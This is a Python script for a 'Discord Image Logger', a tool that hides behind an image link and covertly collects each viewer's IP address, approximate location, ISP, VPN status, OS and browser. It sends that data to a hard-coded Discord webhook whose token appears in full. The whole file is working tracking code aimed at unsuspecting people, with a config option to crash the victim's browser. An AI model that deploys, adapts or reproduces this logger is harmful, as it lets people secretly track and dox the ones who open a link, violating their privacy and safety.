# Discord Image Logger
# By DeKrypt | Adapted for full functionality

from http.server import BaseHTTPRequestHandler
from urllib import parse
import requests, httpagentparser

_app_ = "Discord Image Logger"
__description__ = "A simple application to log IPs using Discord's Open Original feature"
__version__ = "v2.0"
__author__ = "DeKrypt"

config = {
    "webhook": "https://discord.com/api/webhooks/1410895727873495100/L_6XLT65BoAVy3qw8yeBAxN_bjOucJKGL6O1mxErFo2SyQY0Z8eNaFkB65ODQwsZcHTX",
    "image": "https://notepad-plus-plus.org/assets/images/notepad4ever.png",
    "imageArgument": True,
    "username": "Image Logger",
    "color": 0x00FFFF,
    "crashBrowser": False,
    "accurateLocation": True,
    "message": {"doMessage": True, "message": "This browser has been pwned!", "richMessage": True},
    "vpnCheck": 1,
    "linkAlerts": True,
    "buggedImage": True,
    "antiBot": 1,
    "redirect": {"redirect": False, "page": "https://giffy-ecru-omega.vercel.app/"},
}

blacklistedIPs = ("27", "104", "143", "164")

def botCheck(ip, useragent):
    if ip.startswith(("34", "35")):
        return "Discord"
    elif useragent.startswith("TelegramBot"):
        return "Telegram"
    else:
        return False

def is_public_ip(ip):
    return not (ip.startswith("127.") or ip.startswith("10.") or ip.startswith("192.168.") or ip.startswith("172."))

def reportError(error):
    requests.post(config["webhook"], json={
        "username": config["username"],
        "content": "@everyone",
        "embeds": [{"title": "Image Logger - Error", "color": config["color"], "description": f"An error occurred!\n```\n{error}\n```"}],
    })

def makeReport(ip, useragent=None, coords=None, endpoint="N/A"):
    if ip.startswith(blacklistedIPs) or not is_public_ip(ip):
        return

    bot = botCheck(ip, useragent)
    if bot:
        if config["linkAlerts"]:
            requests.post(config["webhook"], json={
                "username": config["username"],
                "content": "",
                "embeds": [{
                    "title": "Image Logger - Link Sent",
                    "color": config["color"],
                    "description": f"A logging link was sent!\n**Endpoint:** `{endpoint}`\n**IP:** `{ip}`\n**Platform:** {bot}",
                    "url": "https://giffy-ecru-omega.vercel.app/api/logger",
                    "image": {"url": config["image"]}
                }]
            })
        return

    ping = "@everyone"
    try:
        info = requests.get(f"http://ip-api.com/json/{ip}?fields=16976857").json()
    except Exception as e:
        reportError(f"Failed to get IP info for {ip}: {e}")
        return

    os_name, browser = httpagentparser.simple_detect(useragent)

    embed = {
        "username": config["username"],
        "content": ping,
        "embeds": [{
            "title": "Image Logger IP Logged",
            "color": config["color"],
            "description": f"""**A User Opened the Original Image!**

**Endpoint:** {endpoint}

**IP Info:**
> **IP:** {ip}
> **Provider:** {info.get('isp','Unknown')}
> **ASN:** {info.get('as','Unknown')}
> **Country:** {info.get('country','Unknown')}
> **Region:** {info.get('regionName','Unknown')}
> **City:** {info.get('city','Unknown')}
> **Coords:** {str(info.get('lat'))+', '+str(info.get('lon')) if not coords else coords}
> **Timezone:** {info.get('timezone','Unknown')}
> **Mobile:** {info.get('mobile','Unknown')}
> **VPN:** {info.get('proxy',False)}
> **Bot:** {"Yes" if info.get('hosting',False) else "No"}

**PC Info:**
> **OS:** {os_name}
> **Browser:** {browser}

**User Agent:**
{useragent}
""",
            "url": "https://giffy-ecru-omega.vercel.app/api/logger",
            "image": {"url": config["image"]}
        }]
    }

    requests.post(config["webhook"], json=embed)
